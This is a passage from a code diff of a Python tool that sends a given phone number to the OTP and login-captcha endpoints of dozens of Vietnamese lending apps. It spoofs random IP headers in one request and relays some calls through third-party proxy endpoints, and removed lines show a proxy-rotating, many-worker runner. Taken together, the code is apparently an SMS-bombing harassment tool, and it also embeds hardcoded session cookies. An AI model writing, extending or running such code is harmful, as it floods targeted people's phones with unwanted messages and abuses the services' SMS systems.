+        return False
+
+async def call2(phone_otp):
+    try:
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json;charset=utf-8",
+            "Origin": "https://vaycash.top",
+            "Referer": "https://vaycash.top/",
+            "language": "vi_VN",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+            "Accept-Language": "vi-VN,vi;q=0.9",
+            "Accept-Encoding": "gzip, deflate, br",
+        }
+        payload_1 = {
+            "smsType": "1",
+            "phone": phone_otp,
+            "loanProductName": "u_cash"
+        }
+        async with httpx.AsyncClient() as client:
+            r1 = await client.post(
+                "https://vaycash.top/app-domain/api/user/sentSms",
+                headers=headers,
+                json=payload_1
+            )
+            payload_2 = {
+                "type": 2,
+                "productName": "u_cash"
+            }
+            r2 = await client.post(
+                "https://vaycash.top/app-domain/api/user/appCollectUpload",
+                headers=headers,
+                json=payload_2
+            )
+
+        return True
+    except:
+        return False
+
+async def call3(phone_otp):
+    phone_formatted = phone_otp.lstrip('0')
+    url = "https://api.hicash.fun/v1/login/send/msm"
+    headers = {
+        "Host": "api.hicash.fun",
+        "Accept": "*/*",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://h5.hicash.fun",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+        "Referer": "https://h5.hicash.fun/",
+        "Accept-Language": "vi-VN,vi;q=0.9",
+        "Priority": "u=3, i",
+    }
+    data = {
+        "phone": phone_formatted,
+        "type": "2",
+        "chntoken": "",
+        "sourse": "1",
+        "ip2": get_random_ip(),
+        "ip3": get_random_ipv6()
+    }
+    try:
+        async with httpx.AsyncClient() as client:
+            r = await client.post(url, headers=headers, data=data)
+
+    except:
+        return False
+
+async def call9(phone_otp):
+    cookies = {
+        "__sbref": "hgpyjywadlykgkoiavkyouqetxuxcpwhpxdqandf",
+        "_cabinet_key": "SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDkxNDkwMTk2Ng.nD_8NLs-CZ7IqIV4JqSpmnAsPVAC0r0WuzMgua9OO1U",
+    }
+    headers_get = {
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
+        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+        "referer": "https://vayxanh.com/",
+    }
+    headers_post = {
+        "accept": "application/json, text/plain, */*",
+        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
+        "content-type": "application/json;charset=utf-8",
+        "origin": "https://lk.vayxanh.com",
+        "referer": f"https://lk.vayxanh.com/?phone={phone_otp}&amount=2000000&term=7",
+        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+        "x-request-id": str(uuid.uuid4()),
+    }
+    try:
+        async with httpx.AsyncClient(timeout=10) as client:
+            resp_get = await client.get(
+                "https://lk.vayxanh.com/",
+                params={"phone": phone_otp, "amount": "2000000", "term": "7",
+                        "utm_source": "direct_vayxanh", "utm_medium": "organic",
+                        "utm_campaign": "direct_vayxanh", "utm_content": "mainpage_submit"},
+                headers=headers_get,
+            )
+            r = await client.post(
+                "https://lk.vayxanh.com/api/4/client/otp/send",
+                headers=headers_post,
+                json={"data": {"phone": phone_otp, "code": "resend", "channel": "ivr"}},
+            )
+
+        print(r.text)
+    except:
+        return False
+
+async def call_hoivan(phone_otp):
+    headers = build_headers("https://ios-h5.onsenhoivanvn.com")
+    payload = {
+        "country_code": "vi",
+        "phone": phone_otp,
+        "app_name": "Hoi Van Cash",
+        "app_package_name": "onse.hoivan.vn",
+        "platform": "ios",
+    }
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
+            "https://vnoii.onsenhoivanvn.com/v2/login/captcha",
+            json={**payload, "app_id": "247000001"},
+            headers=headers
+        )
+
+async def call_hoivan_okay(phone_otp):
+    headers = build_headers("https://ios-h5.onsenhoivanvn.com")
+    payload = {
+        "country_code": "vi",
+        "phone": phone_otp,
+        "app_name": "Hoi Van Cash",
+        "app_package_name": "onse.hoivan.vn",
+        "platform": "ios",
+    }
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
+            "https://vnoai.onsenhoivanvn.com/v2/login/captcha",
+            json={**payload, "type": 2, "app_id": "247000000"},
+            headers=headers
+        )
+
+async def mfast(phone_otp):
+    headers = {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Origin": "https://mfast.vn",
+        "Referer": "https://mfast.vn/",
+        "language": "vi_VN",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+        "X-Requested-With": "XMLHttpRequest",
+    }
+    data = {
+        "phone": phone_otp,
+        "type": "phone",
+    }
+    async with httpx.AsyncClient(timeout=10) as client:
+        r = await client.post(
+            "https://appay-rc.cloudcms.vn/mfast/potential_customer/ajax_confirm_phone",
+            headers=headers,
+            data=data,
+        )
+
+
+async def combo1(phone_otp):
+    headers = build_headers("https://ios-h5.sunmobilefinance.com")
+    payload1 = {
+        "app_name": "Sun Mobile",
+        "packagename": "sunvay.online.vn",
+        "phone": phone_otp,
+        "type": 2,
+        "platform": "ios",
+        "app_id": "238000001",
+    }
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
+            "https://sciiv.sunmobilefinance.com/v2/login/captcha",
+            json=payload1,
+            headers=headers
+        )
+
+
+async def combo2(phone_otp):
+    headers = build_headers("https://ios-h5.sunmobilefinance.com")
+    payload = {
+        "app_name": "Sun Mobile",
+        "packagename": "sunvay.online.vn",
+        "phone": phone_otp,
+        "type": 2,
+        "platform": "android",
+        "app_id": "238000000",
+    }
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
+            "https://scaiv.sunmobilefinance.com/v2/login/captcha",
+            headers=headers,
+            json=payload
+        )
+
+
+async def call8(phone_otp):
+    headers = build_headers("https://ios-h5.marttimeassrt.com")
+    payload = {
+        "country_code": "vi",
+        "phone": phone_otp,
+        "app_name": "Mar Vay",
+        "app_package_name": "com.maritme.assrt.vn",
+        "platform": "android",
+        "app_id": "266000001",
+    }
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
+            "https://mvvii.marttimeassrt.com/v2/login/captcha",
+            json={**payload, "type": 2},
+            headers=headers
+        )
 
 async def call10(phone_otp):
     headers = {
@@ -1096,16 +974,44 @@ async def call10(phone_otp):
         "app_id": "221000000",
         "phone": phone_otp,
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
+    async with httpx.AsyncClient() as client:
         res1 = await client.post(
             "https://api.vaycash.net/v2/login/captcha",
             json={**payload, "type": 1},
-            headers=headers,
+            headers=headers
         )
         res2 = await client.post(
             "https://api.vaycash.net/v2/login/captcha",
             json={**payload, "type": 2},
-            headers=headers,
+            headers=headers
+        )
+
+async def call10_okay(phone_otp):
+    headers = {
+        "Accept": "*/*",
+        "Accept-Language": "vi-VN,vi;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "x-client-type": "phone",
+        "Origin": "https://android.vaycash.net",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+        "Referer": "https://android.vaycash.net/",
+        "Connection": "keep-alive",
+        "Content-Type": "application/json",
+        "Cookie": "HWWAFSESID=63f6c7f810288e2923; HWWAFSESTIME=1774426765256; PHPSESSID=7aaeabbc2187eeaf2633fb3b2890f364",
+    }
+    payload = {
+        "country_code": "vi",
+        "app_name": "VayCash",
+        "app_package_name": "com.vaycash.finance.credit",
+        "platform": "ios",
+        "app_id": "221000001",
+        "phone": phone_otp,
+    }
+    async with httpx.AsyncClient() as client:
+        res = await client.post(
+            "https://notice.vaycash.net/v2/login/captcha",
+            json=payload,
+            headers=headers
         )
 
 async def call11(phone_otp):
@@ -1117,14 +1023,14 @@ async def call11(phone_otp):
         "app_package_name": "credit.kasikvay.ssef",
         "platform": "ios",
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res1 = await client.post(
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
             "https://vkfai.kasikvayfinance.com/v2/login/captcha",
             json={**payload, "type": 1, "app_id": "233000000"},
-            headers=headers,
+            headers=headers
         )
 
-async def calll11(phone_otp):
+async def call11_okay(phone_otp):
     headers = build_headers("https://ios-h5.kasikvayfinance.com")
     payload = {
         "country_code": "vi",
@@ -1133,11 +1039,11 @@ async def calll11(phone_otp):
         "app_package_name": "credit.kasikvay.ssef",
         "platform": "ios",
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res2 = await client.post(
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
             "https://vkfii.kasikvayfinance.com/v2/login/captcha",
             json={**payload, "type": 2, "app_id": "233000001"},
-            headers=headers,
+            headers=headers
         )
 
 async def call12(phone_otp):
@@ -1148,14 +1054,14 @@ async def call12(phone_otp):
         "platform": "ios",
         "app_name": "Mitsui Vay",
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res1 = await client.post(
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
             "http://vishi.sumhanoivn.com/v2/login/captcha",
             json={**payload, "type": 2, "app_id": "231000001"},
-            headers=headers,
+            headers=headers
         )
 
-async def calll12(phone_otp):
+async def call12_okay(phone_otp):
     headers = build_headers("http://sumhanoivn.com", mode="android")
     headers["x-client-type"] = "phone"
     payload = {
@@ -1163,16 +1069,16 @@ async def calll12(phone_otp):
         "platform": "ios",
         "app_name": "Mitsui Vay",
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res2 = await client.post(
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
             "http://vashi.sumhanoivn.com/v2/login/captcha",
             json={**payload, "app_id": "231000000"},
-            headers=headers,
+            headers=headers
         )
 
-async def call10ok(phone_otp):
-    headers1 = build_headers("https://vn-android-topqcash-net.pages.dev")
-    payload1 = {
+async def call13(phone_otp):
+    headers = build_headers("https://vn-android-topqcash-net.pages.dev")
+    payload = {
         "country_code": "vi",
         "phone": phone_otp,
         "app_name": "QCash",
@@ -1181,16 +1087,16 @@ async def call10ok(phone_otp):
         "platform": "android",
         "app_id": "227000000",
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        r1 = await client.post(
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
             "https://vatqi.topqcash.net/v2/login/captcha",
-            json=payload1,
-            headers=headers1
+            json=payload,
+            headers=headers
         )
 
-async def calll10ok(phone_otp):
-    headers2 = build_headers("https://iosweb.topqcash.net/#/login")
-    payload2 = {
+async def call13_okay(phone_otp):
+    headers = build_headers("https://iosweb.topqcash.net/#/login")
+    payload = {
         "country_code": "vi",
         "phone": phone_otp,
         "app_name": "QCash",
@@ -1199,14 +1105,14 @@ async def calll10ok(phone_otp):
         "platform": "ios",
         "app_id": "227000001",
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        r2 = await client.post(
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
             "https://vitqi.topqcash.net/v2/login/captcha",
-            headers=headers2,
-            json=payload2
+            headers=headers,
+            json=payload
         )
 
-async def call11ok(phone_otp):
+async def call14(phone_otp):
     headers = build_headers("https://android.umoneynv.net")
     payload = {
         "country_code": "vi",
@@ -1216,14 +1122,14 @@ async def call11ok(phone_otp):
         "platform": "android",
         "download": "https://dzqjvjgi3bn5t.cloudfront.net/UMoney.apk"
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res1 = await client.post(
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
             "https://api.umoneynv.net/v2/login/captcha",
             json={**payload, "type": 2, "app_id": "2700000000"},
-            headers=headers,
+            headers=headers
         )
 
-async def calll11ok(phone_otp):
+async def call14_okay(phone_otp):
     headers = build_headers("https://android.umoneynv.net")
     payload = {
         "country_code": "vi",
@@ -1233,14 +1139,14 @@ async def calll11ok(phone_otp):
         "platform": "android",
         "download": "https://dzqjvjgi3bn5t.cloudfront.net/UMoney.apk"
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res2 = await client.post(
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
             "http://h5api.umoneynv.net/v2/login/captcha",
             json={**payload, "type": 2, "app_id": "2700000001"},
-            headers=headers,
+            headers=headers
         )
 
-async def call12ok(phone_otp):
+async def call15(phone_otp):
     headers = build_headers("https://android-h5.truongtaionline.com")
     payload = {
         "country_code": "vi",
@@ -1250,19 +1156,19 @@ async def call12ok(phone_otp):
         "platform": "android",
         "app_id": "242000000",
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
+    async with httpx.AsyncClient() as client:
         res1 = await client.post(
             "https://vgtai.truongtaionline.com/v2/login/captcha",
             json={**payload, "type": 1},
-            headers=headers,
+            headers=headers
         )
-        res2 = await client.post(
+        r = await client.post(
             "https://vgtai.truongtaionline.com/v2/login/captcha",
             json={**payload, "type": 2},
-            headers=headers,
+            headers=headers
         )
 
-async def call13ok(phone_otp):
+async def call16(phone_otp):
     headers = build_headers("https://android-h5.dhloantrading.com")
     payload = {
         "country_code": "vi",
@@ -1271,84 +1177,17 @@ async def call13ok(phone_otp):
         "app_package_name": "com.dhloan.trading.vaynhanh",
         "platform": "android",
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res1 = await client.post(
+    async with httpx.AsyncClient() as client:
+        r1 = await client.post(
             "https://dtaiv.dhloantrading.com/v2/login/captcha",
             json={**payload, "type": 2, "app_id": "243000000"},
-            headers=headers,
+            headers=headers
         )
-        res2 = await client.post(
+        r2 = await client.post(
             "https://dtiiv.dhloantrading.com/v2/login/captcha",
             json={**payload, "type": 2, "app_id": "243000001"},
-            headers=headers,
+            headers=headers
         )
-
-
-async def call28(phone_otp):
-    headers = build_headers("https://android-h5.bonmoneydile.com", mode="android")
-    headers["x-client-type"] = "phone"
-    payload = {
-        "phone": phone_otp,
-        "platform": "android",
-        "app_name": "Bon Money",
-    }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res1 = await client.post(
-            "https://bmvai.bonmoneydile.com/v2/login/captcha",
-            json={**payload, "type": 2, "app_id": "260000000"},
-            headers=headers,
-        )
-
-async def calll28(phone_otp):
-    headers = build_headers("https://android-h5.bonmoneydile.com", mode="android")
-    headers["x-client-type"] = "phone"
-    payload = {
-        "phone": phone_otp,
-        "platform": "android",
-        "app_name": "Bon Money",
-    }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res2 = await client.post(
-            "https://bmvii.bonmoneydile.com/v2/login/captcha",
-            json={**payload, "type": 2, "app_id": "260000001"},
-            headers=headers,
-        )
-
-
-async def call14ok(phone_otp):
-    headers = build_headers("https://android-h5.microfinmobile.com")
-    payload = {
-        "country_code": "vi",
-        "phone": phone_otp,
-        "app_name": "Microfin Mobile",
-        "app_package_name": "microfin.moblie.thpay",
-        "platform": "android",
-        "app_id": "239000000",
-    }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res1 = await client.post(
-            "https://mbaiv.microfinmobile.com/v2/login/captcha",
-            json=payload,
-            headers=headers,
-        )
-
-async def calll14ok(phone_otp):
-    headers = build_headers("https://android-h5.microfinmobile.com")
-    payload = {
-        "country_code": "vi",
-        "phone": phone_otp,
-        "app_name": "Microfin Mobile",
-        "app_package_name": "microfin.moblie.thpay",
-        "platform": "android",
-        "app_id": "239000000",
-    }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res2 = await client.post(
-            "https://mbaiv.microfinmobile.com/v2/login/captcha",
-            json={**payload, "type": 2},
-            headers=headers,
-        )
-
 
 async def call17(phone_otp):
     headers = build_headers("https://vn-ios-h5-sunmobile.pages.dev")
@@ -1360,14 +1199,14 @@ async def call17(phone_otp):
         "platform": "ios",
         "app_id": "238000001",
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res1 = await client.post(
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
             "https://sciiv.sunmobilefinance.com/v2/login/captcha",
             json=payload,
-            headers=headers,
+            headers=headers
         )
 
-async def calll17(phone_otp):
+async def call17_okay(phone_otp):
     headers = build_headers("https://vn-android-h5-sunmobile.pages.dev")
     payload = {
         "country_code": "vi",
@@ -1377,11 +1216,11 @@ async def calll17(phone_otp):
         "platform": "android",
         "app_id": "238000000",
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res2 = await client.post(
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
             "https://scaiv.sunmobilefinance.com/v2/login/captcha",
             json={**payload, "type": 2},
-            headers=headers,
+            headers=headers
         )
 
 async def call18(phone_otp):
@@ -1395,14 +1234,14 @@ async def call18(phone_otp):
         "app_id": "2900000000",
         "download": "https://dzqjvjgi3bn5t.cloudfront.net/GbCredit.apk"
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res1 = await client.post(
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
             "https://api.gbcreditvn.net/v2/login/captcha",
             json=payload,
-            headers=headers,
+            headers=headers
         )
 
-async def calll18(phone_otp):
+async def call18_okay(phone_otp):
     headers = build_headers("https://vn-android-gbcreditvn-net.pages.dev")
     payload = {
         "country_code": "vi",
@@ -1413,33 +1252,60 @@ async def calll18(phone_otp):
         "app_id": "2900000000",
         "download": "https://dzqjvjgi3bn5t.cloudfront.net/GbCredit.apk"
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res2 = await client.post(
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
             "https://api.gbcreditvn.net/v2/login/captcha",
             json={**payload, "type": 2},
-            headers=headers,
+            headers=headers
         )
 
 async def call19(phone_otp):
     headers = build_headers("https://bsawv.subkamolplus.com")
     payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Subkamol Lending", "app_package_name": "com.subkamol.lending.sofn", "platform": "android", "app_id": "244000000"}
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res1 = await client.post(
-        "https://bsaiv.subkamolplus.com/v2/login/captcha", 
-        json=payload, 
-        headers=headers
-        )
+    try:
+        async with httpx.AsyncClient() as client:
+            r = await client.post("https://bsaiv.subkamolplus.com/v2/login/captcha", json=payload, headers=headers)
+    except:
+        pass
 
-async def calll19(phone_otp):
+async def call19_okay(phone_otp):
     headers = build_headers("https://bsawv.subkamolplus.com")
     payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Subkamol Lending", "app_package_name": "com.subkamol.lending.sofn", "platform": "android", "app_id": "244000000", "type": 2}
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res2 = await client.post(
-        "https://bsaiv.subkamolplus.com/v2/login/captcha", 
-        json=payload, 
-        headers=headers
+    try:
+        async with httpx.AsyncClient() as client:
+            r = await client.post("https://bsiiv.subkamolplus.com/v2/login/captcha", json=payload, headers=headers)
+    except:
+        pass
+
+async def call20(phone_otp):
+    headers = build_headers("https://android-h5.bonmoneydile.com", mode="android")
+    headers["x-client-type"] = "phone"
+    payload = {
+        "phone": phone_otp,
+        "platform": "android",
+        "app_name": "Bon Money",
+    }
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
+            "https://bmvai.bonmoneydile.com/v2/login/captcha",
+            json={**payload, "type": 2, "app_id": "260000000"},
+            headers=headers
         )
 
+async def call20_okay(phone_otp):
+    headers = build_headers("https://android-h5.bonmoneydile.com", mode="android")
+    headers["x-client-type"] = "phone"
+    payload = {
+        "phone": phone_otp,
+        "platform": "android",
+        "app_name": "Bon Money",
+    }
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
+            "https://bmvii.bonmoneydile.com/v2/login/captcha",
+            json={**payload, "type": 2, "app_id": "260000001"},
+            headers=headers
+        )
 
 async def call21(phone_otp):
     headers = build_headers("https://vn-android-h5-nathco-vay.pages.dev")
@@ -1450,14 +1316,14 @@ async def call21(phone_otp):
         "app_package_name": "com.artmis.dong.vn",
         "platform": "android",
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res1 = await client.post(
+    async with httpx.AsyncClient() as client:
+        res = await client.post(
             "https://oyvai.nathcopay.com/v2/login/captcha",
             json={**payload, "app_id": "235000000"},
-            headers=headers,
+            headers=headers
         )
 
-async def calll21(phone_otp):
+async def call21_okay(phone_otp):
     headers = build_headers("https://vn-android-h5-nathco-vay.pages.dev")
     payload = {
         "country_code": "vn",
@@ -1466,43 +1332,49 @@ async def calll21(phone_otp):
         "app_package_name": "com.artmis.dong.vn",
         "platform": "android",
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res2 = await client.post(
+    async with httpx.AsyncClient() as client:
+        res = await client.post(
             "https://oyvii.nathcopay.com/v2/login/captcha",
             json={**payload, "type": 2, "app_id": "235000001"},
-            headers=headers,
+            headers=headers
         )
 
 async def call22(phone_otp):
-    headers = {
-        "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "vi-VN,vi;q=0.9",
-        "Accept-Encoding": "gzip, deflate, br",
-        "x-client-type": "phone",
-        "Origin": "https://android.vaycash.net",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
-        "Referer": "https://android.vaycash.net/",
-        "Connection": "keep-alive",
-        "Content-Type": "application/json",
-        "Cookie": "HWWAFSESID=63f6c7f810288e2923; HWWAFSESTIME=1774426765256; PHPSESSID=7aaeabbc2187eeaf2633fb3b2890f364",
-    }
+    headers = build_headers("https://android-h5.microfinmobile.com")
     payload = {
         "country_code": "vi",
-        "app_name": "VayCash",
-        "app_package_name": "com.vaycash.finance.credit",
-        "platform": "ios",
-        "app_id": "221000001",
         "phone": phone_otp,
+        "app_name": "Microfin Mobile",
+        "app_package_name": "microfin.moblie.thpay",
+        "platform": "android",
+        "app_id": "239000000",
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res1 = await client.post(
-        "https://notice.vaycash.net/v2/login/captcha",
-        json=payload,
-        headers=headers,
-    )
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
+            "https://mbaiv.microfinmobile.com/v2/login/captcha",
+            json=payload,
+            headers=headers
+        )
 
-async def calll22(phone_otp):
-    headers = build_headers("http://d3pnx0g52v0o6y.cloudfront.net")
+async def call22_okay(phone_otp):
+    headers = build_headers("https://android-h5.microfinmobile.com")
+    payload = {
+        "country_code": "vi",
+        "phone": phone_otp,
+        "app_name": "Microfin Mobile",
+        "app_package_name": "microfin.moblie.thpay",
+        "platform": "android",
+        "app_id": "239000000",
+    }
+    async with httpx.AsyncClient() as client:
+        r = await client.post(
+            "https://mbaiv.microfinmobile.com/v2/login/captcha",
+            json={**payload, "type": 2},
+            headers=headers
+        )
+
+async def call23(phone_otp):
+    headers = build_headers("https://vn-android-gbcreditvn-net.pages.dev")
     payload = {
         "country_code": "vi",
         "phone": phone_otp,
@@ -1512,246 +1384,271 @@ async def calll22(phone_otp):
         "app_id": "2100000000",
         "download": "https://dzqjvjgi3bn5t.cloudfront.net/OKCredit.apk"
     }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res2 = await client.post(
+    async with httpx.AsyncClient() as client:
+        res = await client.post(
             "https://api.getokcredit.net/v2/login/captcha",
             json={**payload, "type": 2},
-            headers=headers,
+            headers=headers
         )
-
-
-def _make_android_ua_headers() -> Dict[str, str]:
-    return {
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-        "X-Device-Id": str(uuid.uuid4()),
-        "x-client-type": "phone",
-    }
-
-async def call101(phone_otp):
-    headers = {
-        "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "vi-VN,vi;q=0.9",
-        "Accept-Encoding": "gzip, deflate, br",
-        "x-client-type": "phone",
-        "Origin": "https://android.vaycash.net",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
-        "Referer": "https://android.vaycash.net/",
-        "Connection": "keep-alive",
-        "Content-Type": "application/json",
-        "Cookie": "HWWAFSESID=63f6c7f810288e2923; HWWAFSESTIME=1774426765256; PHPSESSID=7aaeabbc2187eeaf2633fb3b2890f364",
-    }
-    payload = {
-        "country_code": "vi",
-        "app_name": "VayCash",
-        "app_package_name": "com.vaycash.finance.credit",
-        "platform": "ios",
-        "app_id": "221000001",
-        "phone": phone_otp,
-    }
-    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-        res2 = await client.post(
-            "https://notice.vaycash.net/v2/login/captcha",
-            json=payload,
-            headers=headers,
-        )
-
-async def call_subkamol(phone_otp):
-    headers = build_headers("https://android-h5.subkamolplus.com")
-    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Subkamol Lending", "app_package_name": "com.subkamol.lending.sofn", "platform": "android", "app_id": "244000000"}
-    try:
-        async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-            r = await client.post("https://bsaiv.subkamolplus.com/v2/login/captcha", json=payload, headers=headers)
-    except:
-        pass
-
-async def calll_subkamol(phone_otp):
-    headers = build_headers("https://android-h5.subkamolplus.com")
-    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Subkamol Lending", "app_package_name": "com.subkamol.lending.sofn", "platform": "android", "app_id": "244000001"}
-    try:
-        async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
-            r = await client.post("https://bsiiv.subkamolplus.com/v2/login/captcha", json=payload, headers=headers)
-    except:
-        pass
 
 async def call_mydong(phone_otp):
     headers = build_headers("https://android.mydonny.net/")
     payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Mydong", "app_package_name": "com.mydong.credit.money", "platform": "android", "app_id": "2400000000", "download": "https://dzqjvjgi3bn5t.cloudfront.net/Mydong.apk"}
     try:
-        async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
+        async with httpx.AsyncClient() as client:
             r = await client.post("https://notice.mydonny.net/v2/login/captcha", json=payload, headers=headers)
     except:
         pass
 
-async def calll_mydong(phone_otp):
+async def call_mydong_okay(phone_otp):
     headers = build_headers("https://android.mydonny.net/")
     payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Mydong", "app_package_name": "com.mydong.credit.money", "platform": "android", "app_id": "2400000000", "download": "https://dzqjvjgi3bn5t.cloudfront.net/Mydong.apk"}
     try:
-        async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
+        async with httpx.AsyncClient() as client:
             r = await client.post("https://api.mydonny.net/v2/login/captcha", json=payload, headers=headers)
     except:
         pass
 
-def run_all_round_robin(sync_funcs, proxy_funcs, phone_otps, proxies, workers=100, batch=200, target=2):
-    def make_proxy_wrapper(fn):
-        def wrapper(phone_otp):
-            loop = asyncio.new_event_loop()
-            try:
-                loop.run_until_complete(
-                    run_proxy_async(fn, phone_otp, proxies, workers=workers, batch=batch, target=target)
-                )
-            finally:
-                loop.close()
-        wrapper.__name__ = fn.__name__ + "_proxy"
-        return wrapper
-    all_funcs = sync_funcs + [make_proxy_wrapper(f) for f in proxy_funcs]
-    total = len(phone_otps)
-    for f_idx, func in enumerate(all_funcs, 1):
-        fname = func.__name__
-        for p_idx, phone_otp in enumerate(phone_otps, 1):
-            try:
-                func(phone_otp)
-            except Exception as e:
-                pass
+async def vay24h(phone_otp: str):
+    CF_URL = [
+        "https://ok-6fb5.cotenhp2888.workers.dev",
+        "https://doaxa--71c050ce533111f1bce0ee650bb23af1.web.val.run"
+    ]
+    BASE_URL = random.choice(CF_URL)
+    async with httpx.AsyncClient(timeout=30) as client:
+        r = await client.get(BASE_URL, params={"phone": phone_otp, "fn": "vay24h"})
+        return r.json()
 
-def load_proxies():
-    if not os.path.exists("proxy.txt"):
-        return []
-    proxies = []
-    with open("proxy.txt", 'r') as f:
-        for line in f:
-            line = line.strip()
-            if not line or line.startswith('#'):
-                continue
-            if '://' in line:
-                proxies.append(line)
-            elif line.count(':') == 3:
-                host, port, user, passwd = line.split(':')
-                proxies.append(f"http://{user}:{passwd}@{host}:{port}")
-            elif line.count(':') == 1:
-                proxies.append(f"http://{line}")
-    return proxies
+async def uvwallet(phone_otp: str):
+    CF_URL = [
+        "https://ok-6fb5.cotenhp2888.workers.dev",
+        "https://doaxa--71c050ce533111f1bce0ee650bb23af1.web.val.run"
+    ]
+    BASE_URL = random.choice(CF_URL)
+    async with httpx.AsyncClient(timeout=30) as client:
+        r = await client.get(BASE_URL, params={"phone": phone_otp, "fn": "uvwallet"})
+        return r.json()
 
-async def run_proxy_async(fn, phone_otp, proxies, workers=100, batch=200, target=2):
-    sample = random.sample(list(proxies), min(batch, len(proxies)))
-    sem = asyncio.Semaphore(workers)
-    success = 0
-    stop_event = asyncio.Event()
+async def itake(phone_otp):
+    KEY = b"aajiaozicashmeh5"
+    IV  = b"hajiaozicashmeh5"
 
